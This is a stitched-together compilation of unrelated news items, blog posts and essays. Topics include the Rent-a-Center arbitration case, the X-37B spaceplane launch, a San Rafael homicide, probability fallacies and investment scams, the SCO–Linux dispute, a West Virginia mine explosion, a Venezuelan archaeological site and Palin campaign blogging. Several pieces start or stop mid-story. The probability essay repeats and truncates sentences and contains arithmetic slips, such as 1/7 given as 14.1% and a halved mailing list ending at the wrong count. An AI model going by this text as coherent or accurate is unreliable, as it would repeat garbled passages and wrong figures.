Right To Play is headquartered in Toronto , Canada and has eight national offices including an office in the United States .
These national offices raise funds , build awareness for Right To Play programs and advocate for Sport Development .

The ever - more business friendly Supreme Court will hear oral arguments today in a case that has the potential to shut a whole lot of regular Americans out of the justice system .
The nation ’s largest rent - to - own furniture company , Rent - a - Center , has asked the court to decide essentially whether huge corporate players should be able to use one - sided contracts to opt out of the civil justice system and judge themselves when customers and employees want to sue for discrimination or other abuses .
The case has enormous implications for big business , which has for years now been able to avoid legal accountability and big jury awards for employment discrimination , fraud , and even sexual assault by forcing people to sign what ’s known as a mandatory arbitration clause as a condition of getting a cell phone , using a credit card , buying a car , or getting a job .
The clauses force people to bring any complaint against the company before a private arbitrator , hired by the company , whose decisions ca n’t be reviewed by a judge in most cases .
Not surprisingly , those arbitrators rarely find in favor of the little guy .
But over the past couple of years , the little guy has been fighting back and occasionally winning important victories .
People like Jaime Leigh Jones have , against great odds , prevailed over much more powerful entities once they ’ve gotten inside a regular courtroom .
Leigh is the KBR / Halliburton employee who alleged that she was gang raped by her co-workers in Iraq and then confined to a storage container by her employer .
She recently prevailed in a challenge to the arbitration clause in her contract that would have forced her to have her rape case heard by a Halliburton - hired arbitrator rather than a jury .
Deborah Williams and Richard Welshans , after years of litigation , last year also won a ruling in federal court allowing them to finally bring a fraud lawsuit against the Coffee Beanery , a company they allege duped them into sinking hundreds of thousands of dollars into a doomed franchise .
( The victory , unfortunately , came too late to save their house . )
But if the Supreme Court rules for Rent - a - Center in the case argued today , even those rare victories will become nonexistent .
That ’s because , as Public Citizen ’s Robert Weissman has written , “ The question presented to the Supreme Court in Rent - A - Center is , essentially : Can a corporation ’s hand - picked arbitrator decide whether it is fair for the company to hand - pick its arbitrator ? ”
Rent -a- Center West v. Antonio Jackson got its start back in 2004 , when the nation ’s largest “ rent - to - own ” furniture store hired Jackson , an African - American , as an account manager .
Eventually , Jackson sought promotion , but each time , Rent - a - Center hired a non -black employee with less seniority .
Finally , Jackson was promoted after he complained to various higher - ups , but then after two months , Rent - a - Center fired him without cause .
He sued in February 2007 in federal court for racial discrimination .
But when he went to court , Rent - a - Center argued that the arbitration clause Jackson had signed when he was hired required him to go to private arbitration — and to pay half the cost .
Jackson countered that the arbitration clause was so one - sided that it was completely unconscionable , and thus unenforceable .
For instance , while the provision forced Jackson to take any complaints against the company to arbitration , it allowed Rent - a - Center to sue Jackson in a real court should he disclose trade secrets or other confidential company info .
The agreement also put strict limits on how much information Jackson could procure from Rent - a - Center in discovery and said he could depose two people for his arbitration , a laughably small number compared to what he would need to prove discrimination .
Nonetheless , a federal district court ruled against him — not because the contract was so ridiculous , but because it said that if Jackson wanted to challenge the arbitration clause as unconscionable , he had to do it before a Rent - a - Center - paid arbitrator , not a judge , as is the standard practice .
The district court basically said it was okay for Rent - a - Center to ban judicial review simply by writing it into a contract that Jackson had no choice but to sign .
The 9th Circuit Court of Appeals overturned the decision , arguing that questions about unconscionability were definitely something for the court to oversee .
Rent - a- Center appealed , and the Supreme Court took the case up on an expedited basis and will hear arguments today .
What the court will do is anyone ’s guess .
Given its decidedly pro-business tilt these days , as seen in its recent Citizens United decision allowing unlimited corporate money into elections , it ’s not out of the realm of possibility that it will side with Rent - a - Center .
At the same time , though , Rent - a - Center is hardly a model corporate citizen .
It could provide a case study for why people need access to unbiased courts .
Last year , the state of Washington sued the company for allegedly abusing its customers who made late payments on rent - to - own furniture and electronics .
Investigators turned up customers who ’d had Rent - a - Center employees kicking their doors in and threatening to arrest them and send their children to foster care because they were a day late making a payment on their big screen TVs .
The state found that the company had engaged in unfair and deceptive practices that left consumers unable to figure out exactly how much renting it would take before they finally got to own their stuff ( which no one ever did ) .
State investigators found people who ’d paid more than $ 6,000 for a used TV , for instance .
Even this Supreme Court might have to think twice before letting companies like Rent - a - Center hire arbitrators to decide whether they are behaving badly enough to be sued before a jury .

Advertisement A prototype spaceplane developed for the US military has been launched into orbit from Florida .
The X - 37B , which has been likened to a scaled - down space shuttle , blasted off from Cape Canaveral Air Force Station at 1952 EDT ( 2352 GMT ) on Thursday .
The military vehicle is unpiloted and will carry out the first autonomous re-entry and landing in the history of the US space programme .
The spacecraft can return experiments to Earth for inspection and analysis .
At 9 m ( 29ft ) long and with a 4.5 m ( 15 ft ) wingspan , the reusable spaceplane is about one - quarter the size of the shuttle , with a large engine mounted at the rear of the ship for orbit changing .
The project could lead to the military 's first operational spaceplane
It might be at this point in time that [ the Air Force is ] going to roll the dice and see if something good happens
Dr Joan Johnson - Freese
US Naval War College
And while the space shuttle uses a fuel - cell power - system , the military vehicle is powered by a solar array and lithium - ion batteries .
The precise objectives and cost of the programme are secret , but the first few flights will allow officials to evaluate the vehicle 's performance and ensure components and systems work the way they are supposed to .
" The top priority technology demonstration on this first flight is the vehicle itself , " Gary Payton , the US Air Force 's deputy under secretary for space programs , told journalists on a teleconference this week .
" Getting it into orbit , getting the payload bay doors open , the solar array deployed , learning about on - orbit attitude control and bringing it all back . "
The X - 37B was launched vertically atop an Atlas V rocket .
The Air Force ( USAF ) says the vehicle will be used to test advanced guidance , navigation and control , thermal protection systems , avionics and high temperature structures and seals .
The Pentagon has not specified a duration for this mission , but the X - 37B is designed to operate on orbit for up to 270 days : " In all honesty , we do n't know when it 's coming back for sure .
It depends on the progress that we make with the on - orbit experiments , the on - orbit demonstrations , " said Mr Payton .
Once the mission is complete , a command will be sent from the ground prompting the 5,000kg ( 11,000 lb ) spaceplane to fire its engine to re-enter the atmosphere .
It will then autonomously navigate its way to the 4.5 km ( 15,000 ft ) - long primary runway at Vandenberg Air Force Base in California .
The X - 37B started life in 1999 as a US space agency programme , but Nasa handed the project over to the Pentagon in September 2004 .
As such , the Air Force is in a position to talk openly about the craft 's design , but its purpose remains classified .
Dr Joan Johnson - Freese , chair of national security and decision making at the US Naval War College in Newport , Rhode Island , said the military would be waiting to see if this project yielded new capabilities : " It might be at this point in time that [ the US Air Force is ] going to roll the dice and see if something good happens .
" If it does , they 'll continue with it .
Otherwise , this will be another one of those [ experimental ] projects that goes into a bin somewhere . "
The X - 37B was launched vertically atop an Atlas V rocket The USAF has requisitioned a second experimental plane from the prime contractor Boeing ; this is being targeted for launch sometime in 2011 .
Speculation about the craft 's purpose has led to accusations that the project could move us a step closer to the weaponisation of space .
Mr Payton responded : " I do n't know how this could be called weaponisation of space .
It 's just an updated version of the space shuttle type of activities in space .
We , the Air Force , have a suite of military missions in space and this new vehicle could potentially help us do those missions better . "
Dr Johnson - Freese said that one way in which the spaceplane could potentially be used was as a " manoeuvrable satellite " .
She said that conventional satellites were vulnerable to missile systems because they followed predictable paths in orbit and were relatively easy to spot .
The X - 37B might even be able to evade attempts to shoot it down with anti-satellite ( A - sat ) weapons , she said .
And if enemy forces know when spy satellites are due to fly over their territory , they can limit sensitive activities to times when there are no passes by reconnaissance spacecraft .
The X - 37B could be deployed on a short timescale and could therefore spring a surprise .
The programme is now led by the Air Force Rapid Capabilities Office ( AFRCO ) .
Edwards Air Force Base , also in California , has been designated as the vehicle 's back - up landing facility .
The Soviet Union carried out an autonomous re-entry and landing with its Buran space shuttle in 1988 .

Superheroes save the day , rock stars entertain us and soldiers win our wars .
We do n't get too worked up when the experts come through in the clutch because , well , that 's what they 're supposed to do .
But sometimes the perfect person for the job is n't available , leaving the barrier between the fan and the flying feces totally unguarded .
This tends to be bad news for anyone in the room , but occasionally a nobody -- an unknown and by all accounts unqualified schmuck -- steps in and saves the freaking day anyway .

A New York City Housing Authority supervisor .
Plays catcher on the company softball team ( remember that , there 's a quiz later ) but as a pencil pushing government employee , it 's hard to imagine a man more well protected from heroics in the line of duty .
The Clutch
While doing some paperwork in his office , Felix received a call that one of the apartment buildings he oversaw was engulfed in flames .
Like any reasonable individual , Felix promptly called the fire department and an ambulance .
Then , like a rather unreasonable individual , he got up from his desk and bolted off to the scene of the fire , arriving before emergency services got there .

If you 've ever been willfully ignored by a DMV clerk , or simply watched Saturday Night Live this weekend , you know that government employees are n't known for their proactive problem solving .
Not only did Felix respond to the problem , but he did it faster than 911 .
Since reports did n't specify whether he drove to the scene or sprinted there leaving little trails of smoke in his wake , we 're forced to assume it was the latter , mostly because of what happened next .

A woman on the third floor was waving what looked to Felix like a towel , before he noticed it had limbs and was wailing .
Ever calm under pressure , Felix deduced that the woman was waving a baby out the window , and asked her to kindly cut the shit while he and his fellow caretakers prepared a landing .
Somewhere between " do n't throw " and " your baby , " the woman , likely panicking or on fire , threw a wild pitch .
Eleanor Carlson warned her neighbors that if anything bad ever happened to her , they should tell police to go looking for her son .
The 72 - year - old San Rafael woman had obtained a restraining order against him and was so afraid she intended to reinforce her doors .
About 4 a.m. Monday , one of her neighbors , John Diego , heard an " awful , awful scream " coming from the widow 's home on the 200 block of C Street , a few blocks south of downtown .
When police arrived , they found her on the floor .
Her throat had been slashed , authorities said .
Police would not name the victim , but neighbors identified her as Carlson .
Within hours , police around the Bay Area were looking for her son , Richard Leroy Carlson , 30 , whom San Rafael investigators called " a person of interest . "
They warned that he was believed to be armed with a knife .
Eleanor Carlson long had problems with her son , neighbors said .
In January , police responded to the home to investigate a report that Richard Carlson had attacked his mother during a " violent confrontation , " said Margo Rohrbacher , a San Rafael police spokeswoman .
Eleanor Carlson obtained a temporary restraining order against her son that was served Wednesday , authorities said .
Richard Carlson had not been charged in the January case , but Marin County prosecutors were reviewing it , police said .
Richard Carlson is a " logical person " for police to talk to about his mother 's death , given the earlier incident , Rohrbacher said .
His last known address was in Oakland , Rohrbacher said , and police in the Bay Area were told he could be headed to a West Oakland soup kitchen or to Laney College in Oakland , where he is a student .
About two weeks ago , Eleanor Carlson said her son had tried to choke her and had demanded money from her , said Diego , who knew her for 40 years and whose home is behind Carlson's .
She told Diego to call 911 if he ever heard her scream , and to tell police that her son might be responsible , Diego said .
She had been planning to have her doors reinforced and have a new security system installed , Diego said .
Neighbors said they often saw Eleanor Carlson standing in front of her home in a bathrobe and curlers , looking dejected .
She lived alone after her husband , Richard Carlson , a Golden Gate Bridge toll collector , died in 1989 .
" She was not happy , " Diego said .
While walking his black Labrador retriever through the leafy neighborhood , Steven Schoonover , who lives around the corner from the victim , said , " This is surprising and sad .
She did n't impress upon me as a person who had any enemies . "
Introduction
This article describes how , in our search for order and purpose in life , people sometimes assign meaning to events that are objectively random and devoid of meaning .
Consider these two images — one dot pattern is random , the other is n't : Sample A Sample B
One of the two images above shows a random pattern of dots , the other has been manipulated to resemble a random pattern but is n't really random .
Which image is random ?
In perception studies , most people choose Sample A because Sample B shows tight clusters of dots that do n't really seem random .
But it turns out that Sample A has been artificially arranged to avoid normal clustering , and Sample B shows a truly random ordering of dots .
The meaning of this experiment is that , when people see tight clusters of dots ( or of events ) , they conclude it is n't a chance grouping but has special significance .
But in reality and in nature , events often cluster purely by chance .
The following sections show examples where , for psychological reasons , people assign meaning to meaningless groupings , significance to insignificant coincidences , even invest in outright frauds based on mistaken perceptions of reality .
The Gambler 's Fallacy
The Gambler 's Fallacy is a powerful and deceptive false belief — if this fallacy were to suddenly disappear , many gambling casinos would go out of business .
Here 's how it works — let 's say we flip a fair coin , one that has an equal chance of coming up heads or tails .
By definition , the probability for heads on the first flip is 0.5 or ½.
Now think about these questions :
If you have just gotten one heads result , what is the probability for heads on the next flip ?
If you have just gotten one tails result , what is the probability for heads on the next flip ?
result , what is the probability for heads on the next flip ?
If you have just gotten eight heads results in a row , what is the probability for heads on the next flip ?
Contrary to a widely held belief , the answer to all the above questions is ... 0.5 or ½.
Regardless of what has happened before , the probability for heads in the next coin flip is exactly the same .
Contrary to a widely held belief , the answer to all the above questions is ... 0.5 or ½.
Regardless of what has happened before ,
This fallacy has its roots in confusion between the probability of a sequence of events and the probability of an event separate from the sequence in which it appears :
The probability of tossing eight heads in a row is 2 - 8 , or 1/256 .
is 2 , or 1/256 .
But during the eight coin tosses , the probability of each new heads result considered separately is ½.
Casinos make vast sums of money from people who think , " I 've lost repeatedly at this ( roulette wheel / slot machine / card game ) , therefore my probability of winning must be increasing , so no only should I keep playing , but I should increase my bets . "
But in fact , a past winning or losing streak cannot change one 's future odds of winning .
I 've often wondered whether an education in math might cure the Gambler 's Fallacy .
Friday the 13th
Is Friday the 13th really more risky than another day ?
If we look for anecdotes meant to show the dangers of Friday the 13th , we will likely find some , but they may not mean what we think :
The probability that there will be a Friday the 13th during any given month is equal to the reciprocal of the number of weekdays : 1/7 or 14.1 % .
The average number of Friday the 13ths in a year is equal to the number of months divided by the number of weekdays : 12/7 or 1.71 .
The average probability that a given day will turn out to be Friday the 13th is equal to the average number of Friday the 13ths in a year , divided by the average number of days in a year : 1.71 / 365.25 or 0.468 % .
For simplicity , let 's call this 0.5 % , ½ of one percent .
Let 's give this a personal context .
Let 's say that a subject ( who we will call John ) is very careful and / or lucky , and therefore has a memorably bad experience only every 100 days on average .
Given that there is only a half - percent chance that this bad experience will fall on a Friday the 13th , there is little chance to argue for a connection .
Let 's say that careful John reviews his life on his 70th birthday and recalls 365.25 * 70 / 100 ( 255.67 ) bad experiences .
Given the ½ % probability that any particular day will be a Friday the 13th , John may be able to recall 255.67 * 0.005 = 1.28 occasions where those bad experiences fell on a Friday the 13th .
If John is mathematically and logically inclined , he will disregard an occasion where a bad experience coincided with Friday the 13th , realizing it was coincidental .
But if John is superstitious or irrational , he might argue that the one example proves Friday the 13th is really a more dangerous day than average .
Assembled with John on his 70th birthday are 100 friends of similar age and behavior .
Based on the foregoing , between them they might recall 128 occasions where a bad experience fell on Friday the 13th .
Given the level of scientific literacy in modern society , what is the probability than none of the 100 friends will draw an irrational conclusion ?
In science , a precept called Occam 's razor argues that , among competing theories , the simplest theory tends to be the right one .
The simplest explanation is that sometimes bad things coincidentally happen on Friday the 13th .
The Birthday Problem
A question : how many people need to be gathered in a room for a 50 % probability that two of them share the same birthday ?
This is a perfect example of the disconnect between everyday perceptions and reality .
When people first encounter this question , they usually think along these lines ( for simplicity 's sake let 's disregard leap year ) :
Even with 365 people present , there is a small possibility that all of them will have different birthdates , so the probability is n't 100 % even then .
For a particular person ( let 's call him " John " ) , at first glance it would seem that 365 / 2 ( 182.5 ) people would be needed for a 50 % probability of matching John 's birthdate .
But the above estimate overlooks the possibility that others in the room might have matching birthdates , which reduces the number of possible matches for John 's birthdate .
For reasons given here and to accommodate the possibility of other matching birthdates , we need 253 people to assure a 50 % probability of matching John 's birthdate .
So it seems the number of people needed for a reasonable chance to match John 's birthdate is pretty high , even higher than a pessimistic guess .
But this misses the meaning of the original question — which is not to match John 's particular birthdate but to locate any two matching birthdates .
That changes the logic completely .
It turns out that only 23 people are needed to assure a 50 % probability that two of them have the same birthdate .
Here 's why :
The birthdate of each of the 23 people may be compared to the birthdates of the remaining 22 people .
By this reckoning , the number of possible pairings is 23 * 22 / 2 = 253 .
On the basis of the analysis above and detailed here , 253 pairings is just enough to meet the 50 % probability that two of the 23 people will have the same birthdate .
So , contrary to our instincts , 23 people is enough .
This is another example where a seemingly miraculous coincidence can be explained using probability and common sense .
Amazing Rock
Face Rock
57° 23.959 ' N , 153° 50.904 ' W ,
West shore of Uyak Inlet , Kodiak Island .
Every summer I visit Alaska and paddle around in my kayak .
One day as I paddled on the west side of Kodiak Island , I saw an amazing rock ( see picture this page ) .
I assure my readers the rock is perfectly natural , not man-made , and is n't proof of alien visitation or religious belief .
Some may argue that such a rock , with a clearly sculpted face , could n't possibly happen by chance — it 's too much like a human face to be a coincidence .
Others may argue that the chance for a rock to have this shape is , oh , ten million to one , therefore it 's proof that aliens visited and sculpted it .
But remember Occam 's razor , the idea that the simplest explanation is most likely to be right .
Maybe the explanation is that during my world travels I had encountered ten million rocks , meaning my chance to see a random face in a rock had acquired a probability of 50 % .
At the time of writing I 've been boating and hiking for about 60 years , and I see all sorts of approximate faces in rocks and landscapes , just not very convincing ones — until that day in 2004 when I paddled past the rock shown on this page .
I emphasize only one particular viewing angle works — the first time I saw the face , my kayak was still moving and the face disappeared as fast as it appeared .
I paddled backward slowly , framed the face perfectly and snapped the picture .
Because the view of the face depends so much on being in a particular spot , and because of its location in a wild part of Alaska , I doubt anyone ever noticed it before I did , in particular because one must be in a shallow - water boat like a kayak .
( Read more about this specific outing here . )
An interesting coincidence , but still a coincidence .
Investment Genius
Few things are more common than a successful stock market investor who sells a book with a title like " Secrets of the Winners " , based on his enviable track record and personal wealth .
It 's only common sense that an investor is successful because of his investment strategy — after all , such things can't happen by chance .
Or can they ?
As it happens , it is not possible to publish an effective strategy for stock trading , because once the strategy is published , it must fail ( because everyone will start practicing it , thus destroying its effectiveness ) .
This is obviously true , but based on the number of " Secrets of the Winners " investment books for sale , it 's obvious that people have n't figured this out .
But if there are no legitimate public winning strategies , if instead it 's a fair market and everyone has the same opportunity for success , how can some people become multimillionaires while others lose their money ?
That can't be because of chance , can it ?
Well , as a matter of fact , yes , investment success can and does result from pure chance , and stories of investment success are much more likely to result from chance than genius .
Because everyone is trying to outwit everyone else in unpredictable ways , the stock market is much more a random process than a moral drama with predictable winners and losers .
But even though the market does n't ( and cannot ) reward investment ingenuity , it does pay attention to chance factors .
And this is easily demonstrated — a typical stock market can easily be modeled with a computer program .
Let 's examine such a model ( click here to see the program listing ) :
In the model , the average market value increases by 12 % per year ( compounded weekly ) , a typical long - term growth pattern .
The values of individual stocks randomly fluctuate up and down over time , but over time they track the market average .
over time , but over time they track the market average .
The simulation models the progress of 100,000 investors , each with an initial $ 10,000 stake .
Investors buy and sell stocks randomly , without any hint of an investment strategy .
No transaction fees are charged on trades .
The simulation runs for 20 years .
Here are the program 's results after twenty simulated years :
The worst portfolio of the 100,000 active traders was worth $ 1,451.16 .
The best portfolio was worth $ 4,638,235.88 .
A " buy & hold " investor , one who simply purchased stocks and sat on them for twenty years , never trading , made $ 109,927.40 , roughly 11 times his initial stake ( not accounting for inflation ) .
Active traders who did worse than the " buy & hold " investor : 67,783 ( 68 % ) .
Active traders who did better than the " buy & hold " investor : 32,217 ( 32 % ) .
Active traders who became millionaires : 224 ( 0.22 % ) .
Here are the program 's results after twenty simulated years :
Remember about this simulation that there were no trading fees — active investors were allowed to trade every week , but with no charge for the transactions .
In spite of this unrealistic scenario , active traders were more likely to come out behind ( 68 % ) a buy & hold investor than ahead ( 32 % ) ( it 's true that active investors are not divided 50 - 50 around the buy & hold investor , but the reason is beyond the scope of this article ) .
Given this bleak forecast for active investors compared to buy & hold investors , how do stockbrokers stay in business ?
That 's easy — they lie .
Instead of confessing that a typical investor will come out behind the market average ( even with no brokerage fees ) , they correctly point out that some investors become millionaires .
Every stockbroker has a few stories like the best outcome in this simulation — the lucky investor who started out with $ 10,000 and ended up with $ 4,638,235.88 ( an increase of about 464 times ) .
But this truth cannot erase a more important truth — that on average , a buy & hold investor will do better than an active trader .
The above model does n't take into account the idea that a stockbroker knows more about investing than the average investor , and that hiring a stockbroker is smarter than making personal investment choices .
But is this true — is the expertise of the stockbroker worth his cost ?
In a word , no — the now - famous Wall Street Journal Dartboard Contest posited that a blindfolded investor throwing darts at a list of stocks would do as well as a professional stockbroker , at no cost .
In a multi - year trial , The Wall Street Journal concluded : " ... the performance of the pros versus the Dow Jones Industrial Average was less impressive .
The pros barely edged the DJIA by a margin of 51 to 49 contests .
In other words , simply investing passively in the Dow , an investor would have beaten the picks of the pros in roughly half the contests ( that is , without even considering transactions costs or taxes for taxable investors ) . "
In short , if one hires a stockbroker and must pay transaction fees , the best evidence is such an investor will not do as well as a buy & hold investor , who does n't lose any sleep about what his stockbroker might be doing with his money .
Random Market Outcomes Look at the " Random Market Outcomes " graph on this page .
They show the random distribution of investors created by the simulation above ( and in reality ) .
Now imagine being in the " Gurus " category at the right , the small number of investors who by chance end up way ahead of the game — what would keep you from assuming that your success results from genius rather than chance , and trying to sell your own " Secrets of the Winners " book ?
But in truth , if an investor came up with an effective investment strategy that had proved itself , he would keep it a secret ( because revealing such a strategy always ruins it ) .
Remember this when you see someone crowing about his wonderful investment book — if it had any value , it would n't be offered for sale .
Miracle Man
On June first , you receive a mailing from Miracle Man , an investment counselor who wants to control your stock portfolio .
You are of course skeptical — investment counselors are a dime a dozen and none of them has very good evidence for his abilities ( see the previous section for the reasons ) .
But Miracle Man is braver than most — his mailing includes a prediction about which direction the Dow index will be moving in the coming month ( up or down ) .
That 's not a common thing — most counselors try to avoid making a clear prediction that can be falsified in 30 days .
To your complete shock , Miracle Man mails you a prediction every month for six months , every one contains a prediction about the direction of the Dow for the coming month , and every one of them is right .
You realize too late that if you had acted on Miracle Man 's predictions and moved your assets according to his instructions , you would have made millions of dollars .
To your complete shock , Miracle Man mails you a prediction every month for six months , every one contains a prediction about the direction of the Dow for the coming month , and .
You realize too late that if you had acted on Miracle Man 's predictions and moved your assets according to his instructions ,
In the final mailing , along with another correct prediction , Miracle Man offers to take over your portfolio .
You are an intelligent , educated person , many things sound too good to be true , but in this case , he has mailed you an accurate prediction about the future of the Dow , every month for six months .
He must be the real thing .
But before you sign your assets over to Miracle Man , I have to tell you this is just another scam — it 's ingenious and convincing , but it 's a scam .
As it happens , anyone can produce a run of what seem to be accurate Dow predictions , in fact a computer can do this trick without human interference .
Here 's how : Miracle Man gets a list of names and addresses of investors that is a power of 2 .
Let 's say 215 = 32,768 .
He needs a power of two so he can divide the list repeatedly .
He splits the address list in two .
He mails one list a prediction that the Dow will fall , the other a prediction that the Dow will rise .
At the end of the month , he discards the names that got an incorrect prediction , and repeats from step ( 2 ) above .
At the end of six months , Miracle Man has a list of 256 names , each of whom has gotten a series of six miraculous predictions that could have netted the recipients millions of dollars if they had moved in a timely way .
I include this example because it is so completely convincing — many people can't figure out how the trick works , and some of those end up signing their assets over to someone who might be a complete incompetent or even a criminal .
Even in a clever example like this , common sense and skepticism can help expose a scam :
If Miracle Man is able to predict the Dow with complete accuracy , why does he want to control your portfolio ?
He should be able to use this ability to enrich himself without your help .
If there is a way to predict the Dow 's direction with perfect accuracy , does n't this mean the market is broken ?
Would n't this conclusively invalidate the Efficient Market Hypothesis ?
It is well - known that published investment methods fail by being revealed , so the method being used is either published or its strategy will be revealed by the market moves of Miracle Man , and either way , that would destroy the method 's effectiveness .
This can only mean Miracle Man is n't practicing his own method .
If anyone could make millions of dollars based on monthly , perfectly accurate predictions , the market would collapse .
So something is rotten in Denmark .
Even in a clever example like this , common sense and skepticism can help expose a scam :
This kind of thinking is what separates seasoned , experienced investors from beginners — almost nothing is what it seems , the Efficient Market Hypothesis says there is no consistent way to beat market averages , and most investment counselors are a waste of time and money .

The Popularity of Bicycling is Growing
Every morning I wake up , check email and then quickly go to my Google Reader .
It is loaded up with over 200 feeds and I do my best to jog through them in the morning or over lunch , each day .
One of the common trends for this morning was that many people think that bicycling is becoming more popular .
As I work in a bike shop , you can tell that there is more interest in bikes , even over a year ago .
Numbers are higher and there is hope that either the economy is turning a leaf , or people are learning the benefits of bicycling .
My biggest fear for this year and our economy is the gas pricing going back up .
Yes , temporarily this will benefit the bike industry , but could cripple your regional economy .
Long term it would also hurt anything that needs oil to be made or transported ( just about everything ! )
What are you seeing in your local area ?
Are more or less people biking , and why do you think that is ?
" Why SCO Cant Win "
The legal battle between SCO and the Linux community simply boils down to a larger firms attempt to take away the property rights of a smaller company in order to cover up an obvious error in judgment on the part of IBM .
IBM made a serious mistake in introducing Unix code into Linux without proper notification to — or approval from — SCO , which is the current , documented owner of Unix .
The issue should have been fully vetted before Linux was compromised .
The end result is a complex , no - holds - barred war against a much smaller company in an attempt to cover up and mitigate this mistake .
In the process , the Linux community , in support of IBM , has been duped into using illegal means to attack SCO in the nastiest release of viruses the world has ever seen .
The rest of us are used as cannon fodder in this virus plague .
Efforts to position this as a war between SCO and open source — or as having anything to do with Microsoft — are simply misdirection .
In a period when executives who misuse their authority are punished to extremes , the more likely cause of this problem is the apparent attempt to cover up an ill - advised decision by an IBM executive that unnecessarily exposed IBM and Linux .
Ask yourself these questions :
Have you ever seen IBM in similar litigation ?
When is a $ 40 million company ever a real threat to a $ 90 billion company ?
Can you recall an instance where IBM has aligned itself with a non-government organization that allowed , let alone promoted , violent response ?
What would IBMs response be if a partner , or ex-partner , tried to release Lotus Notes or Tivoli , both technologies acquired by IBM , into the open - source community without permission ?
If SCO has no evidence and is in the wrong , why is the company being so viciously attacked ?
What follows are not only answers to these questions but also evidence that SCO has rights to Unix , that IBMs error in releasing Unix ( AIX ) code into Linux violated those rights , that IBM used the Linux community in an attempt to cover up that mistake , and that the favorable outcome of this case is of critical importance to all of us .
After assessing the following , you can only conclude that SCO should prevail .
To take it further , Id say that , for our common good , SCO must prevail .

Rescue efforts had been an agonizing 100 - hour exercise in frustration as the teams repeatedly inched their way through tangled debris and fallen rock only to have to withdraw because of explosively high levels of methane and carbon monoxide .
Above ground , the miners ’ families waited for word .
Passing much of the week sequestered from the news media , they huddled together in an open - air warehouse on the mine ’s sprawling property , eating pizza , whispering consolations to each other , and sometimes praying .
While rescue efforts continued , company and state officials had been reluctant to release the names of the dead and missing , a move that angered many families longing for closure .
The death toll caused by Monday ’s explosion was the highest in an American mine since a 1970 explosion killed 38 at Finley Coal Company , in Hyden , Ky .
The blast at Upper Big Branch comes four years after a pair of other West Virginia mine disasters — an explosion that killed 12 miners at the Sago mine and a fire that killed two at the Aracoma Alma coal mine .
“ We remained hopeful the four missing miners would have been found alive , ” Don Blankenship , the chief executive of Massey Energy , the mine ’s operator , said in a statement .
“ I personally met with many of the families throughout the week and share their grief at this very painful time . ”
In 2008 , the Aracoma Coal Company , a subsidiary of Massey , agreed to pay $ 4.2 million in criminal fines and civil penalties and to plead guilty to several safety violations related to that fire .
This week ’s disaster came as a particular surprise because last year there were only 34 mining deaths , a record low .

PREGONERO , Venezuela —
Thick slabs of stone are set at a 30 - degree angle into the side of a hill , cloaked in a tangle of undergrowth .
Known as El Porvenir , this pre-Columbian indigenous site in a remote part of western Venezuela has never been truly examined by archaeologists .
And now it looks like it may never be .
The government plans to flood the valley in which El Porvenir lies to create a hydroelectric dam , wiping out the stones and leaving archaeologists unable to determine whether the site was built by a local indigenous tribe .
True examination of the site has been limited due to the remote location and difficult working conditions — the area is know for its particularly aggressive lancehead vipers .
Archaeologist Reina Duran , director of the Tachira Museum in the state capital San Cristobal , said she first visited El Porvenir in 1979 and worked on it each dry season for 10 years .
“ During those years when we came and went it was overgrown and full of mud again , ” she said .
“ Every time we arrived at the site we had to begin the work again . ”
Today , only a small patch of the 25 - meter - wide by 50 - meter - high structure can be seen .
It is flanked on both sides by streams that flow into the nearby Dorados River , or Golden River .
In 1977 a local journalist wrote that it looked “ something like a pyramid , ” and strong debate has prevailed ever since over its origins and uses .
Some biologists claimed it was a natural geological formation but that ’s not a theory shared by Duran .
She believes it was a holy site for the local Pregonero tribe .
Little is known about the indigenous tribes that lived in the region but most are believed to have arrived either from neighboring Colombia or from the Amazon in the south .
Duran believes the evidence she has gathered so far indicates that the Pregoneros subsisted on agricuture and may be related to the still existing Arhuacos of Colombia .
She believes they moved on to the Venezuelan " llanos , " or cattle plains , after the arrival of the Spanish .
She says the cut of the stones appears to be man-made .
The existence of smaller stones to fill in gaps among the paving slabs seems to support her theory .
Duran ’s case was further strengthened by the discovery of a similar structure at the site of an indigenous village near the local town of Pregonero .
A local manuscript recounts how “ it is said that the Indians of Pregonero obeyed the government of Casique Michitu and that this man came to reward or punish in a valley called Chiscas … this place is where today the river joins with the stream of gold . ”
Whatever its origins , there seems to be little doubt that the site was used by the local indigenous people : lithic axes and a clay grinder were discovered nearby .
Tachira , which borders with Colombia , is rich in archaeological sites .
Duran is also investigating a 2,300 - year - old village consisting of 30 terraces of houses at Queniquea , a site that she calls “ the Macchu Picchu of Venezuela . ”
The site has been declared a site of cultural interest by the Institute of National Patrimony , a status that should guarantee its protection .
But whether archaeologists will ever be able to solve El Porvenir ’s mysteries hangs in the balance .
The government has earmarked the valley as the site for a 20 - square - kilometer reservoir .
With Venezuela undergoing its worst electricity crisis in history , plans to flood the valley and build a new power plant are scheduled to begin by 2011 .
“ We have various archaeological missions planned to go there with the aim firstly of analyzing the remains there and secondly what can be rescued before the flooding , ” said Juan Barillas , president of the state company that manages western Venezuela ’s hydroelectric dams .
El Porvenir ’s survival is further threatened by the fact that the Venezuelan army has been using the surrounding forest as target practice .
Just a couple of hundred yards from the site , three - foot craters can be found and pieces of shrapnel are embedded in the trees , some of which have been torn apart by what locals said sounded like cannon fire .
And even if the stones at El Porvenir are transported elsewhere , Duran believes a crucial piece of the jigsaw in mapping Venezuela ’s indigenous history will be lost forever when the valley is submerged underwater .
“ That signs of a settlement nearby could be discovered should not be ruled out , " she said .
" The actual site is what really tells you something . "
Lisa Graas , the founder of Palin Twibe has just been thrown under the bus by Sarah Palin .
Man it must be getting kind of squashed under there .
I know it 's a big ol bus an all , and colourful , but still .........
This was Lisa Graas before Palin nominated Paul
FYI : Bill Johnson is going to win this race because he is right on all the issues .
I do n’t know any tea party people who are comfortable with Rand Paul ’s foreign policy .
Every person I have met in the Johnson campaign is a tea party activist .
Everywhere he goes , he gets big support .
His only impediment is that the Campaign for Liberty ( for Rand Paul , out of staters ) and Washington ( for Trey Grayson ) injected lots of money into Kentucky before Johnson could get name recognition here .
He is THE Reagan conservative in this race , plus he has operated a $ 1 Billion budget as a businessman , has a background in nuclear energy .
He has the " it factor " that Palin has .
He ’s going to win this race and the outside groups and pundits who endorsed prematurely a candidate Kentucky cannot swallow are , as we Kentuckians see it , part of the problem .
It ’s not Rand Paul who needs your advice .
He ’s ca n’t repair this .
It ’s all those who have endorsed him who need to understand what the people in a district actually want before they endorse a candidate .
That is , after all , the conservative way .
Thanks again .

Mudflats thinks ethics may have been breached with the legal fund Palin set up - who would have thought ?
http://www.themudflats.net/...
